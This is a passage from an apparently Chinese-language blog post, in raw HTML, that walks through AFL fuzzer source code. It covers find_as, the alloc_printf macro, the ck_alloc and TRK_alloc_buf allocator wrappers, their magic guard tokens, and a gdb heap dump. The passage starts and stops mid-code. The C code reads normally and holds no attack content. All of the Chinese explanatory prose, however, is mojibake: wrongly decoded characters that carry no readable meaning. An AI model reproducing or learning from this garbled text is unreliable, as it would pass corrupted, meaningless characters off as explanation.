(!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">  tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path); <span class="comment">//@@@@</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">    as_path = afl_path;</span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_printf(_str...) (&#123; \</span></span><br><span class="line"><span class="meta">    u8* _tmp; \</span></span><br><span class="line"><span class="meta">    s32 _len = snprintf(NULL, 0, _str); \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (_len &lt; 0) FATAL(<span class="string">&quot;Whoa, snprintf() fails?!&quot;</span>); \</span></span><br><span class="line"><span class="meta">    _tmp = ck_alloc(_len + 1); \</span></span><br><span class="line"><span class="meta">    snprintf((char*)_tmp, _len + 1, _str); \</span></span><br><span class="line"><span class="meta">    _tmp; \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå®å®šä¹‰å®ç°äº†ä¸€ä¸ªåŠ¨æ€å†…å­˜åˆ†é…çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼Œç±»ä¼¼äº sprintfï¼Œä½†å®ƒä¼šè‡ªåŠ¨åˆ†é…è¶³å¤Ÿçš„å†…å­˜æ¥å­˜å‚¨æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­è°ƒç”¨ck_allocå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEBUG_BUILD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* In non-debug mode, we just do straightforward aliasing of the above functions</span></span><br><span class="line"><span class="comment">   to user-visible names such as ck_alloc(). */</span></span><br><span class="line"><span class="comment">/* åœ¨éè°ƒè¯•æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬åªéœ€å°†ä¸Šè¿°å‡½æ•°ç›´æ¥åˆ«åä¸ºç”¨æˆ·å¯è§çš„åç§°ï¼Œä¾‹å¦‚ ck_alloc() */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc          DFL_ck_alloc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc_nozero   DFL_ck_alloc_nozero</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_realloc        DFL_ck_realloc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_realloc_block  DFL_ck_realloc_block</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_strdup         DFL_ck_strdup</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_memdup         DFL_ck_memdup</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_memdup_str     DFL_ck_memdup_str</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ck_free           DFL_ck_free</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_report()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„è¦æ±‚DEBUG_BUILDä¸ºå‡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ck_alloc(_p1) \</span></span><br><span class="line"><span class="meta">  TRK_ck_alloc(_p1, __FILE__, __FUNCTION__, __LINE__)</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜æœ‰è¿™ä¸ªå®šä¹‰</p><p>å› æ­¤å¾—åˆ°ï¼š</p><p>éè°ƒè¯•æ¨¡å¼ä¸‹çš„æ‰§è¡Œæµç¨‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ck_alloc</span>(size) </span><br><span class="line">  â†’ <span class="built_in">DFL_ck_alloc</span>(size)</span><br><span class="line">    â†’ <span class="built_in">DFL_ck_alloc_nozero</span>(size)  <span class="comment">// å®é™…åˆ†é…</span></span><br><span class="line">    â†’ <span class="built_in">memset</span>(mem, <span class="number">0</span>, size)       <span class="comment">// æ¸…é›¶</span></span><br><span class="line">    â†’ è¿”å›å†…å­˜æŒ‡é’ˆ</span><br></pre></td></tr></table></figure><p>è°ƒè¯•æ¨¡å¼ä¸‹çš„æ‰§è¡Œæµç¨‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ck_alloc</span>(size) </span><br><span class="line">  â†’ <span class="built_in">TRK_ck_alloc</span>(size, __FILE__, __FUNCTION__, __LINE__)</span><br><span class="line">    â†’ <span class="built_in">DFL_ck_alloc</span>(size)         <span class="comment">// å®é™…åˆ†é…</span></span><br><span class="line">    â†’ <span class="built_in">TRK_alloc_buf</span>(ret, file, func, line)  <span class="comment">// è®°å½•åˆ†é…ä¿¡æ¯</span></span><br><span class="line">    â†’ è¿”å›å†…å­˜æŒ‡é’ˆ</span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹DFL_ck_allocå‡½æ•°</p><h4 id="DFL-ck-alloc"><a href="#DFL-ck-alloc" class="headerlink" title="DFL_ck_alloc"></a>DFL_ck_alloc</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate a buffer, returning zeroed memory. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">DFL_ck_alloc</span><span class="params">(u32 size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!size) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  mem = <span class="built_in">DFL_ck_alloc_nozero</span>(size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(mem, <span class="number">0</span>, size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="DFL-ck-alloc-nozero"><a href="#DFL-ck-alloc-nozero" class="headerlink" title="DFL_ck_alloc_nozero"></a>DFL_ck_alloc_nozero</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">DFL_ck_alloc_nozero</span><span class="params">(u32 size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!size) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line">  ret = <span class="built_in">malloc</span>(size + ALLOC_OFF_TOTAL);</span><br><span class="line">  <span class="built_in">ALLOC_CHECK_RESULT</span>(ret, size);</span><br><span class="line"></span><br><span class="line">  ret += ALLOC_OFF_HEAD;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;</span><br><span class="line">  <span class="built_in">ALLOC_S</span>(ret)  = size;</span><br><span class="line">  <span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/* Magic tokens used to mark used / freed chunks. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_C1  0xFF00FF00 <span class="comment">/* Used head (dword)  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_F   0xFE00FE00 <span class="comment">/* Freed head (dword) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_MAGIC_C2  0xF0       <span class="comment">/* Used tail (byte)   */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Positions of guard tokens in relation to the user-visible pointer. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_C1(_ptr)  (((u32*)(_ptr))[-2])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_S(_ptr)   (((u32*)(_ptr))[-1])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_C2(_ptr)  (((u8*)(_ptr))[ALLOC_S(_ptr)])</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">((u32*)(_ptr))[<span class="number">-2</span>] = <span class="number">0xFF00FF00</span> ;</span><br><span class="line">((u32*)(_ptr))[<span class="number">-1</span>] = size ; <span class="comment">// size -&gt;ã€å­—ç¬¦ä¸²é•¿åº¦ã€‘</span></span><br><span class="line">((u8*)(_ptr))[((u32*)(_ptr))[<span class="number">-1</span>]] =  <span class="number">0xF0</span> ;</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹åº”ä½ç½®å†™äº†magic tokenä»¥åŠsizeï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ‰§è¡Œå‰------------------------------------------------------------------------</span></span><br><span class="line">(gdb) x/<span class="number">16</span>gx ret<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555758270</span>:<span class="number">0xf0006e69622f6c61</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555758280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">                                    <span class="meta"># ret</span></span><br><span class="line"><span class="number">0x555555758290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557582a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020d61</span></span><br><span class="line"><span class="comment">// æ‰§è¡Œå------------------------------------------------------------------------</span></span><br><span class="line">(gdb) x/<span class="number">16</span>gx ret<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555758270</span>:<span class="number">0xf0006e69622f6c61</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555758280</span>:<span class="number">0x00000016ff00ff00</span><span class="number">0x0000000000000000</span></span><br><span class="line">                # ã€<span class="number">2</span>ã€‘ã€ã€<span class="number">1</span>ã€‘        <span class="meta"># ret</span></span><br><span class="line"><span class="number">0x555555758290</span>:<span class="number">0x0000000000000000</span><span class="number">0x00f0000000000000</span></span><br><span class="line">                                    # ã€<span class="number">3</span>ã€‘</span><br><span class="line"><span class="number">0x5555557582a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020d61</span></span><br></pre></td></tr></table></figure><p><code>DFL_ck_alloc_nozero</code>å‡½æ•°è¿”å›åä¼šè°ƒç”¨memsetå°†å †å†…å­˜æ¸…é›¶ï¼Œè¯´ç™½äº†<code>DFL_ck_alloc</code>å°±æ˜¯å¤–é¢åŒ…äº†ä¸€ä¸ª<code>memset</code>å¾—åˆ°äº†<code>DFL_ck_alloc_nozero</code></p><h4 id="TRK-ck-alloc"><a href="#TRK-ck-alloc" class="headerlink" title="TRK_ck_alloc"></a>TRK_ck_alloc</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Simple wrappers for non-debugging functions: */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span>* <span class="title">TRK_ck_alloc</span><span class="params">(u32 size, <span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* func,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 u32 line)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret = <span class="built_in">DFL_ck_alloc</span>(size);</span><br><span class="line">  <span class="built_in">TRK_alloc_buf</span>(ret, file, func, line);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„è¿˜æ˜¯<code>DFL_ck_alloc</code>å‡½æ•°</p><p>ç„¶åè°ƒç”¨<code>TRK_alloc_buf</code>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add a new entry to the list of allocated objects. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">TRK_alloc_buf</span><span class="params">(<span class="type">void</span>* ptr, <span class="type">const</span> <span class="type">char</span>* file, <span class="type">const</span> <span class="type">char</span>* func,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 u32 line)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i, bucket;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  bucket = <span class="built_in">TRKH</span>(ptr);                        <span class="comment">//è®¡ç®—å“ˆå¸Œå€¼</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Find a free slot in the list of entries for that bucket. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TRK_cnt[bucket]; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TRK[bucket][i].ptr) &#123;</span><br><span class="line"></span><br><span class="line">      TRK[bucket][i].ptr  = ptr;</span><br><span class="line">      TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">      TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">      TRK[bucket][i].line = line;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No space available - allocate more. */</span></span><br><span class="line"></span><br><span class="line">  TRK[bucket] = <span class="built_in">DFL_ck_realloc_block</span>(TRK[bucket],</span><br><span class="line">    (TRK_cnt[bucket] + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="keyword">struct</span> TRK_obj));</span><br><span class="line"></span><br><span class="line">  TRK[bucket][i].ptr  = ptr;</span><br><span class="line">  TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">  TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">  TRK[bucket][i].line = line;</span><br><span class="line"></span><br><span class="line">  TRK_cnt[bucket]++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°ä»¥ä¸‹çš„æ•°æ®ç»“æ„ï¼š</p><p><code>TRK_obj</code>ç»“æ„ä½“ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TRK_obj</span> &#123;</span><br><span class="line">  <span class="type">void</span> *ptr;      <span class="comment">// åˆ†é…çš„å†…å­˜æŒ‡é’ˆ</span></span><br><span class="line">  <span class="type">char</span> *file;     <span class="comment">// åˆ†é…æ—¶çš„æºæ–‡ä»¶å</span></span><br><span class="line">  <span class="type">char</span> *func;     <span class="comment">// åˆ†é…æ—¶çš„å‡½æ•°å</span></span><br><span class="line">  u32  line;      <span class="comment">// åˆ†é…æ—¶çš„è¡Œå·</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å“ˆå¸Œæ¡¶ç³»ç»Ÿï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_BUCKETS 4096</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TRK_obj</span>* TRK[ALLOC_BUCKETS];    <span class="comment">// å“ˆå¸Œæ¡¶æ•°ç»„</span></span><br><span class="line">u32 TRK_cnt[ALLOC_BUCKETS];            <span class="comment">// æ¯ä¸ªæ¡¶çš„å…ƒç´ è®¡æ•°</span></span><br></pre></td></tr></table></figure><p>å“ˆå¸Œå‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TRKH(_ptr) (((((u32)(_ptr)) &gt;&gt; 16) ^ ((u32)(_ptr))) % ALLOC_BUCKETS)</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;           <span class="comment">// ç©ºæŒ‡é’ˆæ£€æŸ¥</span></span><br><span class="line">bucket = <span class="built_in">TRKH</span>(ptr);         <span class="comment">// è®¡ç®—å“ˆå¸Œæ¡¶ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾ç©ºé—²æ§½ä½ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TRK_cnt[bucket]; i++)</span><br><span class="line">    <span class="keyword">if</span> (!TRK[bucket][i].ptr) &#123;</span><br><span class="line">        <span class="comment">// æ‰¾åˆ°ç©ºé—²æ§½ä½ï¼Œè®°å½•åˆ†é…ä¿¡æ¯</span></span><br><span class="line">        TRK[bucket][i].ptr  = ptr;</span><br><span class="line">        TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">        TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">        TRK[bucket][i].line = line;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€æ‰©å®¹ï¼ˆå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é‡æ–°åˆ†é…æ›´å¤§çš„æ¡¶ç©ºé—´</span></span><br><span class="line">TRK[bucket] = <span class="built_in">DFL_ck_realloc_block</span>(TRK[bucket],</span><br><span class="line">    (TRK_cnt[bucket] + <span class="number">1</span>) * <span class="built_in">sizeof</span>(<span class="keyword">struct</span> TRK_obj));</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨æ–°åˆ†é…çš„ä½ç½®è®°å½•ä¿¡æ¯</span></span><br><span class="line">TRK[bucket][i].ptr  = ptr;</span><br><span class="line">TRK[bucket][i].file = (<span class="type">char</span>*)file;</span><br><span class="line">TRK[bucket][i].func = (<span class="type">char</span>*)func;</span><br><span class="line">TRK[bucket][i].line = line;</span><br><span class="line"></span><br><span class="line">TRK_cnt[bucket]++;          <span class="comment">// å¢åŠ æ¡¶çš„å…ƒç´ è®¡æ•°</span></span><br></pre></td></tr></table></figure><h3 id="find-as-1"><a href="#find-as-1" class="headerlink" title="find_as"></a>find_as</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);  <span class="comment">// è·å–&quot;/afl-gcc&quot;çš„èµ·å§‹åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">  u8 *dir;</span><br><span class="line"></span><br><span class="line">  *slash = <span class="number">0</span>;            <span class="comment">// å¯¹argv0è¿›è¡Œ\x00æˆªæ–­ï¼Œä½¿å…¶å˜ä¸º/usr/local/bin</span></span><br><span class="line">  dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">  *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">    as_path = dir;</span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">  <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">  as_path = AFL_PATH;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="DFL-ck-strdup"><a href="#DFL-ck-strdup" class="headerlink" title="DFL_ck_strdup"></a>DFL_ck_strdup</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> u8* <span class="title">DFL_ck_strdup</span><span class="params">(u8* str)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* ret;</span><br><span class="line">  u32   size;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  size = <span class="built_in">strlen</span>((<span class="type">char</span>*)str) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_CHECK_SIZE</span>(size);</span><br><span class="line">    </span><br><span class="line">  ret = <span class="built_in">malloc</span>(size + ALLOC_OFF_TOTAL);</span><br><span class="line">  <span class="built_in">ALLOC_CHECK_RESULT</span>(ret, size);</span><br><span class="line"></span><br><span class="line">  ret += ALLOC_OFF_HEAD;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ALLOC_C1</span>(ret) = ALLOC_MAGIC_C1;</span><br><span class="line">  <span class="built_in">ALLOC_S</span>(ret)  = size;</span><br><span class="line">  <span class="built_in">ALLOC_C2</span>(ret) = ALLOC_MAGIC_C2;</span><br><span class="line"></span><br><span class="line">  <span 